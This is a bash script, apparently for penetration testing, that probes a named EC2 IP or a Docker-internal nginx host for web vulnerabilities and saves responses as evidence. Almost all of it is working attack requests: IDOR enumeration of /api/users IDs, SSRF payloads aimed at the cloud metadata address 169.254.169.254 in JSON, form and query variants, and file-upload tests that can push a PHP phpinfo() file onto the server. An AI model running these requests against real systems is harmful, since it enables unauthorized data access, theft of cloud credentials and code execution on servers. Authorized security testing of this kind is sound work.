#!/usr/bin/env bash
set -euo pipefail

# -------------------------
# CONFIG - edit before run
# -------------------------
MODE="host"                    # "host" (default) or "container"
EC2_IP="3.227.150.252"         # set your EC2 public IP for host mode
CONTAINER_NAME="zap"           # used only if MODE=container
TARGET_HOST_INTERNAL="compose-nginx-1"  # internal Docker name (container mode)
OUTPUT_DIR="./evidence"
IDS_TO_TEST=(1 2 3 4 5)        # IDs for IDOR enumeration
IDOR_PATHS=("/api/users")      # append other object endpoints if needed
SSRF_PATHS=("/api/proxy" "/proxy" "/api/fetch" "/preview" "/fetch")  # adjust to discovered endpoints
UPLOAD_PATHS=("/upload" "/api/upload" "/files")
RUN_PHP_TEST=false             # set true only if you are authorized and accept risk of creating php file on server

# SSRF payload (metadata)
SSRF_PAYLOAD='{"url":"http://169.254.169.254/latest/meta-data/"}'

# -------------------------
# PREP
# -------------------------
mkdir -p "$OUTPUT_DIR"
timestamp() { date +%FT%T%z; }

# Helper: run curl from host or inside zap container
run_curl() {
  # args: method url data_or_empty out_prefix extra_curl_args...
  local method=$1; shift
  local url=$1; shift
  local data=$1; shift
  local outpre=$1; shift
  local extra="$*"
  local headers_file="${OUTPUT_DIR}/${outpre}-headers.txt"
  local body_file="${OUTPUT_DIR}/${outpre}-body.txt"

  if [ "$MODE" = "host" ]; then
    if [ -n "$data" ]; then
      curl -k -s -X "$method" -H "Content-Type: application/json" -d "$data" -D "$headers_file" "$url" -o "$body_file" $extra || true
    else
      curl -k -s -X "$method" -D "$headers_file" "$url" -o "$body_file" $extra || true
    fi
  else
    # container mode: run curl inside container, write files to /tmp, then docker cp out
    local tmph="/tmp/${outpre}-headers.txt"
    local tmpb="/tmp/${outpre}-body.txt"
    if [ -n "$data" ]; then
      docker exec "$CONTAINER_NAME" bash -lc "curl -k -s -X '$method' -H 'Content-Type: application/json' -d '$data' -D $tmph '$url' -o $tmpb $extra || true"
    else
      docker exec "$CONTAINER_NAME" bash -lc "curl -k -s -X '$method' -D $tmph '$url' -o $tmpb $extra || true"
    fi
    docker cp "${CONTAINER_NAME}:$tmph" "$headers_file" >/dev/null 2>&1 || true
    docker cp "${CONTAINER_NAME}:$tmpb" "$body_file" >/dev/null 2>&1 || true
    # cleanup inside container
    docker exec "$CONTAINER_NAME" rm -f "$tmph" "$tmpb" >/dev/null 2>&1 || true
  fi
  printf '[%s] Wrote %s and %s\n' "$(timestamp)" "$headers_file" "$body_file"
}

# -------------------------
# IDOR checks
# -------------------------
echo "== IDOR checks =="
for base in "${IDOR_PATHS[@]}"; do
  for id in "${IDS_TO_TEST[@]}"; do
    url=""
    if [ "$MODE" = "host" ]; then
      url="https://${EC2_IP}${base}/${id}"
    else
      url="https://${TARGET_HOST_INTERNAL}${base}/${id}"
    fi
    run_curl "GET" "$url" "" "idor_$(echo ${base} | sed 's#/##g')_${id}"
  done
done

# -------------------------
# SSRF checks
# -------------------------
echo "== SSRF checks =="
for p in "${SSRF_PATHS[@]}"; do
  if [ "$MODE" = "host" ]; then
    url="https://${EC2_IP}${p}"
  else
    url="https://${TARGET_HOST_INTERNAL}${p}"
  fi

  # JSON POST payload test
  run_curl "POST" "$url" "$SSRF_PAYLOAD" "ssrf_json_$(echo ${p} | sed 's#/##g')"

  # form POST test (common)
  if [ "$MODE" = "host" ]; then
    headers_file="${OUTPUT_DIR}/ssrf_form_$(echo ${p} | sed 's#/##g')-headers.txt"
    body_file="${OUTPUT_DIR}/ssrf_form_$(echo ${p} | sed 's#/##g')-body.txt"
    curl -k -s -X POST -F "url=http://169.254.169.254/latest/meta-data/" -D "$headers_file" "$url" -o "$body_file" || true
    printf '[%s] Wrote %s and %s\n' "$(timestamp)" "$headers_file" "$body_file"
  else
    docker exec "$CONTAINER_NAME" bash -lc "curl -k -s -X POST -F 'url=http://169.254.169.254/latest/meta-data/' -D /tmp/ssrf_form_headers '$url' -o /tmp/ssrf_form_body || true"
    docker cp "${CONTAINER_NAME}:/tmp/ssrf_form_headers" "${OUTPUT_DIR}/ssrf_form_$(echo ${p} | sed 's#/##g')-headers.txt" >/dev/null 2>&1 || true
    docker cp "${CONTAINER_NAME}:/tmp/ssrf_form_body" "${OUTPUT_DIR}/ssrf_form_$(echo ${p} | sed 's#/##g')-body.txt" >/dev/null 2>&1 || true
    docker exec "$CONTAINER_NAME" rm -f /tmp/ssrf_form_headers /tmp/ssrf_form_body >/dev/null 2>&1 || true
    printf '[%s] Wrote %s and %s\n' "$(timestamp)" "${OUTPUT_DIR}/ssrf_form_$(echo ${p} | sed 's#/##g')-headers.txt" "${OUTPUT_DIR}/ssrf_form_$(echo ${p} | sed 's#/##g')-body.txt"
  fi

  # GET-with-query variant
  if [ "$MODE" = "host" ]; then
    run_curl "GET" "${url}?u=http://169.254.169.254/latest/meta-data/" "" "ssrf_get_$(echo ${p} | sed 's#/##g')"
  else
    run_curl "GET" "${url}?u=http://169.254.169.254/latest/meta-data/" "" "ssrf_get_$(echo ${p} | sed 's#/##g')"
  fi
done

# -------------------------
# File upload tests
# -------------------------
echo "== File upload tests =="
TMP_TXT="$(mktemp /tmp/poc.XXXX).txt"
echo "poc-$(date +%s)" > "$TMP_TXT"
for p in "${UPLOAD_PATHS[@]}"; do
  if [ "$MODE" = "host" ]; then
    url="https://${EC2_IP}${p}"
    headers_file="${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-txt-headers.txt"
    body_file="${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-txt-body.txt"
    curl -k -s -X POST -F "file=@${TMP_TXT}" -D "$headers_file" "$url" -o "$body_file" || true
    printf '[%s] Wrote %s and %s\n' "$(timestamp)" "$headers_file" "$body_file"
  else
    # copy temp into container, post, then docker cp results out
    docker cp "$TMP_TXT" "${CONTAINER_NAME}:/tmp/poc.txt"
    docker exec "$CONTAINER_NAME" bash -lc "curl -k -s -X POST -F 'file=@/tmp/poc.txt' -D /tmp/upload_txt_headers '$url' -o /tmp/upload_txt_body || true"
    docker cp "${CONTAINER_NAME}:/tmp/upload_txt_headers" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-txt-headers.txt" >/dev/null 2>&1 || true
    docker cp "${CONTAINER_NAME}:/tmp/upload_txt_body" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-txt-body.txt" >/dev/null 2>&1 || true
    docker exec "$CONTAINER_NAME" rm -f /tmp/poc.txt /tmp/upload_txt_headers /tmp/upload_txt_body >/dev/null 2>&1 || true
    printf '[%s] Wrote %s and %s\n' "$(timestamp)" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-txt-headers.txt" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-txt-body.txt"
  fi
done

# optional php test (dangerous) - only if operator toggles RUN_PHP_TEST=true
if [ "$RUN_PHP_TEST" = "true" ]; then
  TMP_PHP="$(mktemp /tmp/poc.XXXX).php"
  echo "<?php phpinfo(); ?>" > "$TMP_PHP"
  for p in "${UPLOAD_PATHS[@]}"; do
    if [ "$MODE" = "host" ]; then
      headers_file="${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-php-headers.txt"
      body_file="${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-php-body.txt"
      curl -k -s -X POST -F "file=@${TMP_PHP}" -D "$headers_file" "https://${EC2_IP}${p}" -o "$body_file" || true
      printf '[%s] Wrote %s and %s\n' "$(timestamp)" "$headers_file" "$body_file"
      # if returned path attempt fetch
      # (user must manually inspect body files for returned path and fetch if present)
    else
      docker cp "$TMP_PHP" "${CONTAINER_NAME}:/tmp/poc.php"
      docker exec "$CONTAINER_NAME" bash -lc "curl -k -s -X POST -F 'file=@/tmp/poc.php' -D /tmp/upload_php_headers 'https://${TARGET_HOST_INTERNAL}${p}' -o /tmp/upload_php_body || true"
      docker cp "${CONTAINER_NAME}:/tmp/upload_php_headers" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-php-headers.txt" >/dev/null 2>&1 || true
      docker cp "${CONTAINER_NAME}:/tmp/upload_php_body" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-php-body.txt" >/dev/null 2>&1 || true
      docker exec "$CONTAINER_NAME" rm -f /tmp/poc.php /tmp/upload_php_headers /tmp/upload_php_body >/dev/null 2>&1 || true
      printf '[%s] Wrote %s and %s\n' "$(timestamp)" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-php-headers.txt" "${OUTPUT_DIR}/upload_$(echo ${p} | sed 's#/##g')-php-body.txt"
    fi
  done
  rm -f "$TMP_PHP"
fi

rm -f "$TMP_TXT"

echo "== Done =="
echo "Evidence saved under: $OUTPUT_DIR"
echo "Inspect headers (.txt) and bodies (.txt/.json) to determine positives."
